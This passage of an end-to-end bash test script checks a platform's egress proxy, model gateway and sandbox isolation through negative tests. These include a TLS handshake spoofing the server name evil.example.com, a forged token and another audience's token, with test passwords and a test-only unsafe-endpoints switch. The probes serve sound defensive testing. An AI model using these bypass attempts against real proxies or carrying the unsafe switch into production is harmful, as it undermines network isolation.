  contains "an enabled domain is reachable through the proxy (CONNECT 200)" '^connect=200 code=200$' "$allowed"
  contains "the enabled domain's TLS server answered end to end (no interception)" 's_server' "$allowed"
  contains "an enabled domain that resolves to an internal address is refused" '^connect=403 ' "$(via_proxy "https://$INTERNAL_HOST/")"
  contains "a not-enabled domain is still blocked" '^connect=403 ' "$(via_proxy https://registry.npmjs.org/)"
  # SNI must equal the CONNECT host: the same tunnel with another TLS server name is cut.
  # "New, TLSv1.x, Cipher is …" only after a completed handshake ("New, (NONE)" otherwise; the
  # "SSL handshake has read" line is printed either way).
  s_client="openssl s_client -proxy egress-proxy.kobe.internal:80 -proxy_user kobe -proxy_pass 'pass:$egress_token' -connect $UPSTREAM_HOST:443"
  contains "control: a TLS handshake with the matching server name completes through the proxy" '^1$' \
    "$(in_sandbox "echo | $s_client -servername $UPSTREAM_HOST 2>&1 | grep -c '^New, TLS'")"
  contains "a TLS server name that differs from the CONNECT host is cut (SNI mismatch)" '^0$' \
    "$(in_sandbox "echo | $s_client -servername evil.example.com 2>&1 | grep -c '^New, TLS'")"

  # Revocation reaches open tunnels: keep one open, disable the domain, the proxy closes it.
  in_sandbox "rm -f /tmp/kobe-e2e-tunnel.log; setsid nohup sh -c \"sleep 120 | ($s_client -servername $UPSTREAM_HOST -quiet \
    >/dev/null 2>&1; echo CLOSED >> /tmp/kobe-e2e-tunnel.log)\" >/dev/null 2>&1 & sleep 5; echo started" >/dev/null
  contains "an open tunnel to an enabled domain stays up" '^OPEN$' \
    "$(in_sandbox 'grep -q CLOSED /tmp/kobe-e2e-tunnel.log 2>/dev/null && echo CLOSED || echo OPEN')"
  psql_kobe "DELETE FROM team_egress WHERE team_id = '$E2E_TEAM_ID' AND domain = '$UPSTREAM_HOST';" >/dev/null
  notify_egress
  contains "disabling the domain closes the already-open tunnel" '^CLOSED$' \
    "$(in_sandbox 'for i in $(seq 1 20); do grep -q CLOSED /tmp/kobe-e2e-tunnel.log 2>/dev/null && break; sleep 1; done; \
      grep -q CLOSED /tmp/kobe-e2e-tunnel.log 2>/dev/null && echo CLOSED || echo OPEN')"
  contains "a disabled domain is blocked again (change hint, no restart)" '^connect=403 ' \
    "$(until_proxy "https://$UPSTREAM_HOST/" '^connect=403 ')"

  contains "blocked attempts are recorded as egress.blocked events for the run" '^[1-9][0-9]*$' \
    "$(psql_kobe "SELECT count(*) FROM events WHERE team_id = '$E2E_TEAM_ID' AND kind = 'egress.blocked'")"
  conn_audit=""
  for _ in $(seq 1 20); do
    conn_audit=$(psql_kobe "SELECT string_agg(DISTINCT target->>'outcome', ',' ORDER BY target->>'outcome') FROM audit_log
      WHERE team_id = '$E2E_TEAM_ID' AND action = 'egress.connection'")
    [[ "$conn_audit" == *allowed* && "$conn_audit" == *blocked* ]] && break
    sleep 2
  done
  contains "every connection is in the audit log (egress.connection: allowed and blocked)" '^allowed,blocked' "$conn_audit"
  contains "connection audit records bytes for allowed tunnels" '^[1-9][0-9]*$' \
    "$(psql_kobe "SELECT max((target->>'bytesDown')::bigint) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'egress.connection' AND target->>'outcome' = 'allowed'")"
  fi # client_ready
  # Receiving side: only team namespaces may connect to the proxy (release namespace is refused),
  # checked only after the same probe pod reached the server (positive control).
  wait_endpoints "$NS" kobe-server kobe-egress-proxy
  recv=$(probe "$NS" "$(gated http://kobe-server/healthz proxy http://kobe-egress-proxy/healthz)")
  contains "control: the release-namespace probe reaches the server" '^control=REACHED$' "$recv"
  contains "the egress proxy admits nothing but sandboxes (probe from the release namespace)" '^proxy=BLOCKED$' "$recv"
elif [[ "${CI:-}" == "true" ]]; then
  fail "egress checks need KOBE_SANDBOX_IMAGE and a sandbox pod"
else
  echo "SKIP egress checks (KOBE_SANDBOX_IMAGE not set)"
fi


fi # gate1-prep skips the sections above

# KOBE-40: models through Bifrost. A fake OpenAI/Anthropic/Gemini upstream stands in for the
# providers (CI has no provider keys). The Owner configures providers (with keys), the catalog and
# the team's models through the admin API; the gateway sync pushes them to Bifrost; a sandbox-like
# client calls each provider kind through the model-gateway shim with its model-gateway session
# token, and is refused without it, with another audience's token, and after revocation.
echo "==> model gateway (KOBE-40)"
if [[ -n "${KOBE_SANDBOX_IMAGE:-}" ]]; then
  $KUBECTL create namespace "$LLM_NS" --dry-run=client -o yaml | $KUBECTL apply -f - >/dev/null
  $KUBECTL -n "$LLM_NS" run llm --restart=Never --image="ghcr.io/splittingatom/kobe-model-gateway:$TAG" \
    --image-pull-policy=IfNotPresent --labels=app=llm --command -- node dist/testing/fake-llm-main.js >/dev/null
  $KUBECTL -n "$LLM_NS" expose pod llm --port=80 --target-port=8080 --name=llm >/dev/null
  $KUBECTL -n "$LLM_NS" wait --for=condition=Ready pod/llm --timeout=180s >/dev/null 2>&1 || true
  wait_endpoints "$LLM_NS" llm
  LLM="http://llm.$LLM_NS.svc.cluster.local"
  # Bifrost may reach the fake provider (a private address): explicit egress rule, like a LAN Ollama.
  llm_rule=$(printf '[{"to":[{"namespaceSelector":{"matchLabels":{"kubernetes.io/metadata.name":"%s"}}}],"ports":[{"protocol":"TCP","port":8080}]}]' "$LLM_NS")
  if out=$($HELM upgrade kobe charts/kobe -n "$NS" --reuse-values --wait --timeout 5m \
      --set-json "bifrost.networkPolicy.extraEgress=$llm_rule" --set bifrost.allowUnsafeProviderEndpoints=true 2>&1); then
    ok "Bifrost may reach the fake model provider (test-only unsafe endpoints switch on)"
  else fail "Bifrost may reach the fake model provider: $out"; fi

  # A member of the e2e team with no sandbox row yet (tokens are minted for live claims only), and
  # the Owner as that team's admin (to choose the team's models through the team API).
  MODEL_USER_ID=8b3f3c4d-2e5f-4a7b-8c1d-2e3f4a5b6c7d
  psql_kobe "INSERT INTO users (id, name, email, email_verified) VALUES ('$MODEL_USER_ID', 'E2E models', 'models@e2e.test', true) ON CONFLICT DO NOTHING;
    INSERT INTO teams (id, slug, name) VALUES ('$E2E_TEAM_ID', 'e2e', 'E2E') ON CONFLICT DO NOTHING;
    INSERT INTO team_members (team_id, user_id, role) VALUES ('$E2E_TEAM_ID', '$MODEL_USER_ID', 'member') ON CONFLICT DO NOTHING;
    INSERT INTO team_members (team_id, user_id, role) SELECT '$E2E_TEAM_ID', id, 'team_admin' FROM users WHERE email = 'owner@e2e.test'
      ON CONFLICT (team_id, user_id) DO UPDATE SET role = 'team_admin';" >/dev/null
  # The admin API as the Owner, from inside a server pod: signs in once, then sends each request
  # (one per argument: "METHOD /path [json]") and prints "<status> <body>" per request.
  as_owner() {
    $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "
      const base = 'http://127.0.0.1:8080', origin = process.env.KOBE_PUBLIC_URL;
      const h = { origin, 'content-type': 'application/json', 'x-kobe-team': '$E2E_TEAM_ID' };
      // Sign-in is rate limited (3 per 10 s per address): wait out a 429 instead of failing.
      let login;
      for (let i = 0; i < 4; i++) {
        login = await fetch(base + '/api/auth/sign-in/email', { method: 'POST', headers: h,
          body: JSON.stringify({ email: 'owner@e2e.test', password: 'e2e owner password' }) });
        if (login.status !== 429) break;
        await new Promise((r) => setTimeout(r, 11000));
      }
      const cookie = login.headers.getSetCookie().map((c) => c.split(';')[0]).join('; ');
      await fetch(base + '/v1/me/teams/active', { method: 'PUT', headers: { ...h, cookie },
        body: JSON.stringify({ teamId: '$E2E_TEAM_ID' }) });
      for (const req of process.argv.slice(1)) {
        const [method, path, ...rest] = req.split(' ');
        const body = rest.join(' ');
        const res = await fetch(base + path, { method, headers: { ...h, cookie }, ...(body ? { body } : {}) });
        console.log(res.status + ' ' + (await res.text()).slice(0, 400));
      }
    " "$@" 2>&1
  }
  setup_models=$(as_owner \
    "POST /v1/install/models/providers {\"kind\":\"openai\",\"name\":\"Fake OpenAI\",\"api_key\":\"e2e-provider-key-openai\",\"base_url\":\"$LLM\",\"allow_private_network\":true}" \
    "POST /v1/install/models/providers {\"kind\":\"anthropic\",\"name\":\"Fake Anthropic\",\"api_key\":\"e2e-provider-key-anthropic\",\"base_url\":\"$LLM\",\"allow_private_network\":true}" \
    "POST /v1/install/models/providers {\"kind\":\"gemini\",\"name\":\"Fake Gemini\",\"api_key\":\"e2e-provider-key-gemini\",\"base_url\":\"$LLM/v1beta\",\"allow_private_network\":true}" \
    "POST /v1/install/models/providers {\"kind\":\"ollama\",\"name\":\"Fake Ollama\",\"base_url\":\"$LLM\",\"allow_private_network\":true}" \
    "POST /v1/install/models/providers {\"kind\":\"openai_compatible\",\"id\":\"vllm\",\"name\":\"Fake vLLM\",\"base_url\":\"$LLM\",\"allow_private_network\":true}" \
    "POST /v1/install/models/catalog {\"alias\":\"fast\",\"provider_id\":\"openai\",\"model\":\"gpt-fake\"}" \
    "POST /v1/install/models/catalog {\"alias\":\"smart\",\"provider_id\":\"anthropic\",\"model\":\"claude-fake\"}" \
    "POST /v1/install/models/catalog {\"alias\":\"gem\",\"provider_id\":\"gemini\",\"model\":\"gemini-fake\"}" \
    "POST /v1/install/models/catalog {\"alias\":\"local\",\"provider_id\":\"ollama\",\"model\":\"llama-fake\"}" \
    "POST /v1/install/models/catalog {\"alias\":\"qwen\",\"provider_id\":\"vllm\",\"model\":\"qwen-fake\"}" \
    "PUT /v1/team/models/fast {\"enabled\":true,\"is_default\":true}" \
    "PUT /v1/team/models/smart {\"enabled\":true}" \
    "PUT /v1/team/models/gem {\"enabled\":true}" \
    "PUT /v1/team/models/local {\"enabled\":true}" \
    "PUT /v1/team/models/qwen {\"enabled\":true}")
  printf '     model admin: %s\n' "$(printf '%s' "$setup_models" | cut -c1-60 | tr '\n' '|')"
  expect "the Owner configures providers, the catalog and the team's models (admin API)" '^(200|201) ' "$setup_models"
  if printf '%s' "$setup_models" | grep -q 'e2e-provider-key'; then fail "provider keys are never returned"
  else ok "provider keys are never returned"; fi
  contains "provider key changes are audited without the key" '^5$' \
    "$(psql_kobe "SELECT count(*) FROM audit_log WHERE action = 'models.provider.added' AND target::text NOT LIKE '%e2e-provider-key%'")"
  t0=$SECONDS
  synced=$(wait_for 60 '^in_sync=true' gateway_state)
  contains "Bifrost reflects the configuration (gateway in sync)" '^in_sync=true error=-$' "$synced"
  printf '     gateway in sync after %ss\n' "$((SECONDS - t0))"
  if [[ "$SHARD" == gate1-prep ]]; then exit "$failed"; fi

  # KOBE-44: the catalog's model listing asks the real Bifrost to call a provider with its key. A
  # provider on a private address WITHOUT allow_private_network must not be reached that way.
  priv_add=$(as_owner "POST /v1/install/models/providers {\"kind\":\"openai_compatible\",\"id\":\"e2epriv\",\"name\":\"Private, not allowed\",\"api_key\":\"e2e-private-key\",\"base_url\":\"$LLM\",\"allow_private_network\":false}")
  expect "a keyed provider on a private address is added with private network off" '^201 ' "$priv_add"
  # Wait until Bifrost has the provider (the listing answers 200, not 409 provider_not_synced).
  priv_listed() { as_owner "GET /v1/install/models/providers/e2epriv/models" | head -1; }
  priv_ready=$(wait_for 45 '^200 ' priv_listed)
  printf '     private provider in the gateway: %s | %s\n' "$(printf '%s' "$priv_ready" | cut -c1-120)" "$(gateway_state)"
  priv_refresh=$(as_owner "POST /v1/install/models/providers/e2epriv/models/refresh")
  printf '     private refresh: %s\n' "$(printf '%s' "$priv_refresh" | cut -c1-200)"
  # Bifrost v2.2.5 refuses such a provider when the sync pushes it (gateway error bifrost_rejected,
  # observed in CI), so it never gets as far as a list-models call; a Bifrost that accepted it must
  # still not list its models. Either way no model list comes back.
  if printf '%s' "$priv_refresh" | grep -q '"discovery":"ok"'; then
    fail "listing models of a private-address provider (private network off) is refused: $(printf '%s' "$priv_refresh" | cut -c1-200)"
  elif printf '%s' "$priv_refresh" | grep -q '^200 ' || \
      { printf '%s' "$priv_refresh" | grep -q 'provider_not_synced' && [[ "$(gateway_state)" == *bifrost_rejected* ]]; }; then
    ok "listing models of a private-address provider (private network off) is refused"
  else fail "listing models of a private-address provider (private network off) is refused: $(printf '%s' "$priv_refresh" | cut -c1-200)"; fi
  priv_seen=$(probe "$NS" "$(answers "$LLM/_seen")")
  if [[ -n "$priv_seen" ]] && ! printf '%s' "$priv_seen" | grep -q 'e2e-private-key'; then
    ok "Bifrost never sent that provider's key to the private address"
  else fail "Bifrost never sent that provider's key to the private address"; fi
  contains "the refresh is audited without the key" '^1$' \
    "$(psql_kobe "SELECT count(*) FROM audit_log WHERE action = 'models.provider.models_refreshed' AND target->>'providerId' = 'e2epriv' AND target::text NOT LIKE '%e2e-private-key%'")"
  as_owner "DELETE /v1/install/models/providers/e2epriv" >/dev/null
  contains "the gateway is in sync again once that provider is removed" '^in_sync=true error=-$' \
    "$(wait_for 60 '^in_sync=true' gateway_state)"

  # The sandbox-like client: team namespace (team NetworkPolicy), gVisor, no DNS, the shim at
  # model-gateway.kobe.internal as in real sandboxes; a model-gateway token for the model user.
  MODEL_CLIENT="model-client-$RANDOM"
  PODS+=("-n $TEAM_NS $MODEL_CLIENT")
  $KUBECTL -n "$TEAM_NS" run "$MODEL_CLIENT" --restart=Never --image="$KOBE_SANDBOX_IMAGE" --overrides="{\"spec\":{
    \"runtimeClassName\":\"gvisor\",\"automountServiceAccountToken\":false,\"serviceAccountName\":\"kobe-sandbox\",$SEC_POD,
    \"dnsPolicy\":\"None\",\"dnsConfig\":{\"nameservers\":[\"127.0.0.1\"]},
    \"hostAliases\":[{\"ip\":\"${mg_ip:-0.0.0.0}\",\"hostnames\":[\"model-gateway.kobe.internal\"]}],
    \"containers\":[{\"name\":\"client\",\"image\":\"$KOBE_SANDBOX_IMAGE\",\"command\":[\"sleep\",\"3600\"],$SEC_CTR,
      \"resources\":{\"requests\":{\"cpu\":\"50m\",\"memory\":\"64Mi\"},\"limits\":{\"cpu\":\"500m\",\"memory\":\"256Mi\"}},
      \"volumeMounts\":[{\"name\":\"tmp\",\"mountPath\":\"/tmp\"}]}],
    \"volumes\":[{\"name\":\"tmp\",\"emptyDir\":{}}]}}" >/dev/null 2>&1 || true
  if $KUBECTL -n "$TEAM_NS" wait --for=condition=Ready "pod/$MODEL_CLIENT" --timeout=240s >/dev/null 2>&1; then
    ok "the model client pod (sandbox image, gVisor) is ready"
    in_client() { $KUBECTL -n "$TEAM_NS" exec "$MODEL_CLIENT" -c client -- sh -c "$1" 2>&1 || true; }
    MODEL_SANDBOX=5c4d3e2f-1a0b-4c9d-8e7f-6a5b4c3d2e1f
    model_token=$(mint kobe.model-gateway "$MODEL_SANDBOX" "$MODEL_USER_ID")
    egress_aud_token=$(mint kobe.egress-proxy "$MODEL_SANDBOX" "$MODEL_USER_ID")
    MG=http://model-gateway.kobe.internal:80
    # → the body, then "code=<status>".
    model_call() { # path json [header…]
      local path="$1" body="$2"
      shift 2
      local hdrs="" hh
      for hh in "$@"; do hdrs="$hdrs -H '$hh'"; done
      in_client "curl -s -m 30 -X POST $MG$path -H 'content-type: application/json' $hdrs -d '$body' -w '\ncode=%{http_code}\n'"
    }
    chat() { model_call /v1/chat/completions "{\"model\":\"$1\",\"messages\":[{\"role\":\"user\",\"content\":\"hello-e2e\"}]${3:-}}" "Authorization: Bearer $2"; }
    # Positive control and CNI warm-up: wait until the shim answers this pod at all.
    up=$(in_client "if $(retry "curl -s -o /dev/null -m 5 $MG/healthz" 120); then echo shim=ANSWERS; else echo shim=SILENT; fi")
    contains "control: the model-gateway shim answers the sandbox-like client" '^shim=ANSWERS$' "$up"
    contains "OpenAI: a sandbox calls a model through the shim with its token" 'fake-openai: hello-e2e' \
      "$(chat openai/gpt-fake "$model_token")"
    contains "OpenAI: streaming responses stream through" '^data: \[DONE\]' \
      "$(chat openai/gpt-fake "$model_token" ',"stream":true')"
    # KOBE-43: the shim forced stream_options.include_usage on that streaming call (it sent none),
    # and Bifrost passed it on to the provider.
    contains "the provider was asked for the stream's usage report (include_usage forced)" \
      '"includeUsage":true' "$(probe "$NS" "$(answers "$LLM/_seen")")"
    contains "Anthropic native (x-api-key): answered by the Anthropic upstream" 'fake-anthropic: hello-e2e' \
      "$(model_call /anthropic/v1/messages '{"model":"anthropic/claude-fake","max_tokens":16,"messages":[{"role":"user","content":"hello-e2e"}]}' \
        "x-api-key: $model_token" 'anthropic-version: 2023-06-01')"
    contains "Gemini (x-goog-api-key): answered by the Gemini upstream" 'fake-gemini: hello-e2e' \
      "$(model_call /genai/v1beta/models/gemini/gemini-fake:generateContent '{"contents":[{"role":"user","parts":[{"text":"hello-e2e"}]}]}' \
        "x-goog-api-key: $model_token")"
    contains "Ollama: answered through Bifrost's Ollama provider" 'fake-openai: hello-e2e' \
      "$(chat ollama/llama-fake "$model_token")"
    contains "OpenAI-compatible (vLLM): answered through a custom provider" 'fake-openai: hello-e2e' \
      "$(chat kobe-vllm/qwen-fake "$model_token")"
    contains "a call without a token is refused (401)" '^code=401$' \
      "$(model_call /v1/chat/completions '{"model":"openai/gpt-fake","messages":[]}')"
    contains "a forged token is refused (401)" '^code=401$' "$(chat openai/gpt-fake forged.token.value-xxxxxxxxxx)"
    contains "another audience's token (egress proxy) is refused (401)" '^code=401$' \
      "$(chat openai/gpt-fake "$egress_aud_token")"
    contains "a model outside the team's enabled models is refused (403)" '^code=403$' \
      "$(chat openai/gpt-not-enabled "$model_token")"
    contains "Bifrost's admin API is not reachable through the shim (404)" '^code=404$' \
      "$(in_client "curl -s -m 10 -H 'Authorization: Bearer $model_token' $MG/api/providers -w '\ncode=%{http_code}\n'")"
    # Direct to Bifrost (bypassing the shim) is blocked; checked only after the shim answered.
    if [[ "$up" == *shim=ANSWERS* ]]; then
      direct=$(in_client "curl -s -m 8 -o /dev/null http://${bifrost_ip:-0.0.0.0}:8080/health && echo bifrost=REACHED || echo bifrost=BLOCKED")
    else
      direct="bifrost=UNTESTED"
    fi
    contains "the sandbox-like client cannot reach Bifrost directly" '^bifrost=BLOCKED$' "$direct"
    seen=$(probe "$NS" "$(answers "$LLM/_seen")")
    contains "provider keys reached the upstream (attached outside the sandbox)" 'e2e-provider-key-anthropic' "$seen"
    if printf '%s' "$seen" | grep -Eq 'sk-bf-|e2e-[0-9]|eyJ'; then fail "no sandbox credential or virtual key reached the provider"
    else ok "no sandbox credential or virtual key reached the provider"; fi

    # Bifrost itself, bypassing the shim (which also refuses disabled models on its own): from a
    # server pod, with the model user's virtual key as the sync stored it → "code=<status>".
    bifrost_direct() { # model
      $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "
        const db = await import('/app/node_modules/@kobe/db/dist/index.js');
        const d = db.createDb(process.env.KOBE_DATABASE_URL);
        try {
          const rows = await db.withTeam(d.db, '$E2E_TEAM_ID', (tx) => tx.select().from(db.modelGatewayKeys)
            .where(db.eq(db.modelGatewayKeys.userId, '$MODEL_USER_ID')));
          const box = new db.SecretBox([process.env.KOBE_MODELS_VIRTUAL_KEY_SECRET], db.VIRTUAL_KEY_PURPOSE);
          const vk = box.open(rows[0].vkValueEnc, db.virtualKeyContext('$E2E_TEAM_ID', '$MODEL_USER_ID'));
          const r = await fetch('http://kobe-bifrost:8080/v1/chat/completions', { method: 'POST',
            headers: { 'content-type': 'application/json', 'x-bf-vk': vk }, signal: AbortSignal.timeout(15000),
            body: JSON.stringify({ model: process.argv[1], messages: [{ role: 'user', content: 'hi' }] }) });
          console.log('code=' + r.status);
        } catch (e) { console.log('error=' + e.message); } finally { await d.close(); }
      " "$1" 2>&1 | tail -1
    }
    until_bifrost() { # expected-code model [seconds]
      local out="" end=$((SECONDS + ${3:-20}))
      while :; do
        out=$(bifrost_direct "$2")
        if [[ "$out" == "code=$1" ]] || ((SECONDS >= end)); then break; fi
        sleep 1
      done
      printf '%s\n' "$out"
    }
    until_code() { # expected-code model token [seconds]
      local out="" end=$((SECONDS + ${4:-20}))
      while :; do
        out=$(chat "$2" "$3")
        if printf '%s\n' "$out" | grep -q "^code=$1$" || ((SECONDS >= end)); then break; fi
        sleep 1
      done
      printf '%s\n' "$out"
    }
    contains "control: Bifrost answers the member's virtual key for an enabled model" '^code=200$' \
      "$(until_bifrost 200 kobe-vllm/qwen-fake)"
    # ac-1: a team admin change reaches Bifrost within 10 s (LISTEN/NOTIFY → sync → admin API).
    contains "the team disables a model through the team API" '^200 ' "$(as_owner "PUT /v1/team/models/qwen {\"enabled\":false}")"
    t0=$SECONDS
    disabled=$(until_bifrost 403 kobe-vllm/qwen-fake)
    elapsed=$((SECONDS - t0))
    contains "Bifrost refuses the disabled model (pushed by the sync)" '^code=403$' "$disabled"
    if ((elapsed <= 10)); then ok "the change reached Bifrost within 10 s (${elapsed}s)"
    else fail "the change reached Bifrost within 10 s (took ${elapsed}s)"; fi
    contains "the shim refuses the disabled model too (its own enablement check)" '^code=403$' \
      "$(chat kobe-vllm/qwen-fake "$model_token")"
    # Fail closed: the team's last model disabled → Bifrost refuses everything for the key.
    expect "the team disables its remaining models" '^200 ' "$(as_owner \
      "PUT /v1/team/models/fast {\"enabled\":false}" "PUT /v1/team/models/smart {\"enabled\":false}" \
      "PUT /v1/team/models/gem {\"enabled\":false}" "PUT /v1/team/models/local {\"enabled\":false}")"
    contains "with nothing enabled, Bifrost refuses a previously enabled model (key deactivated)" '^code=403$' \
      "$(until_bifrost 403 openai/gpt-fake)"
    as_owner "PUT /v1/team/models/fast {\"enabled\":true}" >/dev/null
    contains "re-enabling a model restores access through the shim" 'fake-openai: hello-e2e' \
      "$(until_code 200 openai/gpt-fake "$model_token" 30)"

    # KOBE-41: the working path. The Owner (a team member with a real sandbox, suspended since
    # the interrupted-run story) sends a message: the sandbox wakes, kobe-sandbox-agent trades its
    # bootstrap token, Pi starts with kobe-models, calls the team's default model through the
    # model-gateway shim with the sandbox's session token and the run id, Bifrost attaches the
    # provider key, and the fake model's answer streams back to the API as text.delta events.
    echo "==> Pi model wiring (KOBE-41)"
    as_owner "PUT /v1/team/models/fast {\"enabled\":true,\"is_default\":true}" >/dev/null
    # The scripted agents above held the Owner's sandbox identity; the message below must reach
    # the Owner's REAL sandbox (woken by the router), so wait until their connections are gone.
    $KUBECTL -n "$TEAM_NS" delete pod e2e-agent e2e-approver --ignore-not-found --wait=true >/dev/null 2>&1 || true
    owner_closed() { [[ "$(psql_kobe "SELECT count(*) FROM sandbox_connections WHERE team_id = '$E2E_TEAM_ID' AND user_id = '$owner_id' AND closed_at IS NULL")" == 0 ]]; }
    if until_ok 180 owner_closed; then ok "no scripted agent holds the Owner's sandbox identity any more"
    else fail "no scripted agent holds the Owner's sandbox identity any more"; fi
    read -r -d '' CHAT_JS <<'JS' || true
const [team, content, timeoutMs, model, agentId, reuseThread, approveAll, fileIds] = process.argv.slice(1);
const base = "http://127.0.0.1:" + process.env.PORT;
const origin = new URL(process.env.KOBE_PUBLIC_URL).origin;
const jar = new Map();
const headers = () => ({ origin, "content-type": "application/json", "x-kobe-team": team,
  cookie: [...jar].map(([k, v]) => k + "=" + v).join("; ") });
const call = async (method, path, body) => {
  const res = await fetch(base + path, { method, headers: headers(), body: body === undefined ? undefined : JSON.stringify(body) });
  for (const c of res.headers.getSetCookie()) { const [pair] = c.split(";"); const at = pair.indexOf("="); jar.set(pair.slice(0, at), pair.slice(at + 1)); }
  const text = await res.text();
  let json = {}; try { json = JSON.parse(text); } catch {}
  return { status: res.status, json, text };
};
const out = (k, v) => console.log(k + "=" + v);
let login;
for (let i = 0; i < 4; i++) {
  login = await call("POST", "/api/auth/sign-in/email", { email: "owner@e2e.test", password: "e2e owner password" });
  if (login.status !== 429) break;
  await new Promise((r) => setTimeout(r, 11000));
}
out("signin", login.status);
await call("PUT", "/v1/me/teams/active", { teamId: team });
// KOBE-44: an optional model chosen for the thread (an alias the team enabled).
// KOBE-89: an optional agent (a gallery agent's id) to chat with.
// KOBE-131: an optional existing thread to continue (an artifact update must stay in its thread).
const thread = reuseThread ? { status: 200, json: { thread_id: reuseThread } } : await call("POST", "/v1/threads", { title: "kobe-41", ...(model ? { model } : {}), ...(agentId ? { agent_id: agentId } : {}) });
out("thread", thread.status + ":" + (thread.json.model ?? "default"));
out("thread_id", thread.json.thread_id ?? "-");
const t0 = Date.now();
const sent = await call("POST", "/v1/threads/" + thread.json.thread_id + "/messages", { content, ...(fileIds ? { file_ids: fileIds.split(",") } : {}) });
out("message", sent.status);
const runId = sent.json.run_id;
out("run", runId);
// KOBE-131: artifact writes are approval-gated in ask-on-write (D23/D29): allow what the run asks.
const approvals = approveAll ? setInterval(async () => {
  const list = await call("GET", "/v1/approvals?status=pending&run_id=" + runId);
  for (const a of list.json.approvals || []) await call("POST", "/v1/approvals/" + a.approval_id, { decision: "allow" });
}, 1000) : undefined;
// Follow the run's event stream until a terminal event (the sandbox may have to wake first).
const controller = new AbortController();
const timer = setTimeout(() => controller.abort(), Number(timeoutMs));
const artifactEvents = [];
const fileEvents = []; // KOBE-152: file.shared as id:name:size
let text = "", terminal = "none", code = "-", errorMessage = "-", first = null, waking = "-", startedModel = "-";
try {
  const res = await fetch(base + "/v1/runs/" + runId + "/events", { headers: { ...headers(), accept: "text/event-stream" }, signal: controller.signal });
  out("stream", res.status);
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  while (terminal === "none") {
    const { done, value } = await reader.read();
    if (done) break;
    buf += decoder.decode(value, { stream: true });
    let i;
    while ((i = buf.indexOf("\n\n")) >= 0) {
      const block = buf.slice(0, i); buf = buf.slice(i + 2);
      const type = (block.match(/^event: (.*)$/m) || [])[1];
      const data = (block.match(/^data: (.*)$/m) || [])[1];
      if (!type) continue;
      let payload = {}; try { payload = JSON.parse(data).payload ?? {}; } catch {}
      if (type === "sandbox.waking") waking = payload.reason;
      if (type === "run.started") startedModel = payload.model ?? "-";
      if (type === "artifact.created" || type === "artifact.updated") artifactEvents.push(type + ":" + payload.artifact_id + ":v" + (payload.version ?? "?"));
      if (type === "file.shared") fileEvents.push(payload.file_id + ":" + payload.name + ":" + payload.size);
      if (type === "text.delta") { if (first === null) first = Date.now() - t0; text += payload.delta ?? ""; }
      if (type === "run.completed" || type === "run.failed" || type === "run.interrupted" || type === "run.budget_stopped") {
        terminal = type;
        code = payload.error?.code ?? "-";
        errorMessage = payload.error?.message ?? "-";
      }
    }
  }
} catch (e) { out("stream_error", e.name); }
clearTimeout(timer);
if (approvals) clearInterval(approvals);
out("waking", waking);
out("started_model", startedModel);
out("first_token_ms", first ?? "-");
out("terminal_ms", Date.now() - t0);
out("artifact_events", artifactEvents.join(",") || "-");
out("file_events", fileEvents.join(",") || "-");
out("terminal", terminal);
out("code", code);
out("error_message", errorMessage);
out("text", text);
JS
    chat_run() { # content timeout-ms [model] [agent-id] [thread-id] [approve-all] [file-ids] → the CHAT_JS output (not `chat`: KOBE-40's helper above)
      $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "$CHAT_JS" "$E2E_TEAM_ID" "$1" "$2" "${3:-}" "${4:-}" "${5:-}" "${6:-}" "${7:-}" 2>&1 | tail -16
    }
    chat_out=$(chat_run "hello-pi-$RANDOM" 300000)
    printf '     chat: %s\n' "$(printf '%s' "$chat_out" | grep -v '^text=' | tr '\n' ' ')"
    chat_run=$(printf '%s\n' "$chat_out" | sed -n 's/^run=//p')
    contains "a message starts a run (201)" '^message=201$' "$chat_out"
    contains "the run completed with the fake model's streamed answer (Pi → shim → Bifrost → upstream)" \
      '^text=fake-openai: hello-pi-[0-9]+$' "$chat_out"
    contains "the run ended run.completed" '^terminal=run.completed$' "$chat_out"
    contains "the woken sandbox produced a first token" '^first_token_ms=[0-9]+$' "$chat_out"
    contains "the shim attributed the model call to the run (x-kobe-run-id from Pi)" "\"runId\":\"$chat_run\"" \
      "$($KUBECTL -n "$NS" logs -l app.kubernetes.io/component=model-gateway --tail=-1 --since=15m 2>/dev/null | grep -F "\"runId\":\"${chat_run:-none}\"" | head -1)"
    # KOBE-43: the shim wrote the call to the run_usage ledger from the upstream's usage report.
    usage_row() { psql_kobe "SELECT status || '|' || usage_source || '|' || input_tokens || '|' || output_tokens FROM run_usage WHERE team_id = '$E2E_TEAM_ID' AND run_id = '${chat_run:-00000000-0000-4000-8000-000000000000}' ORDER BY at LIMIT 1"; }
    contains "the model call is in the run_usage ledger with the provider's reported tokens" \
      '^200\|reported\|[1-9][0-9]*\|[1-9][0-9]*$' "$(wait_for 30 '^200\|' usage_row)"
    contains "the team usage dashboard counts it" '^200 .*"calls":[1-9]' "$(as_owner "GET /v1/team/usage")"
    seen_now=$(probe "$NS" "$(answers "$LLM/_seen")")
    contains "the upstream saw the provider key (attached by Bifrost, outside the sandbox)" 'e2e-provider-key' "$seen_now"
    if [[ -n "$seen_now" ]] && ! printf '%s' "$seen_now" | grep -q 'eyJ'; then ok "no session token (JWT) reached the upstream"
    else fail "no session token (JWT) reached the upstream"; fi
    # KOBE-71: the Owner's sandbox just ran Pi for that message, under gVisor. Pi runs under a Pi
    # identity, not as the agent; another identity can neither write nor read that Pi's runtime
    # directory, nor read the bootstrap token, nor signal the agent or that Pi. (`kubectl exec`
    # runs with the agent's uid and groups, so it can use kobe-runas as the agent does; 2015 is an
    # identity no Pi uses while a single thread runs.)
    echo "==> sandbox privilege separation (KOBE-71)"
    read -r -d '' PRIVSEP_SH <<'SH' || true
R=/opt/kobe/bin/kobe-runas
agent=$(pgrep -f '^node .*sandbox-agent/dist/index.js' | head -1)
pi=$(ps -eo pid=,uid= | awk '$2 >= 2000 && $2 <= 2063 { print $1; exit }')  # Pi sets its own process title
dir=$(ls -d /run/kobe-pi/pi-* 2>/dev/null | head -1)
echo "agent=$(stat -c %u /proc/$agent) caps=$(awk '/^CapEff/ {print $2}' /proc/$agent/status)"
echo "pi_uid=$(stat -c %u /proc/$pi) dir=$(stat -c '%U:%G %a' $dir)"
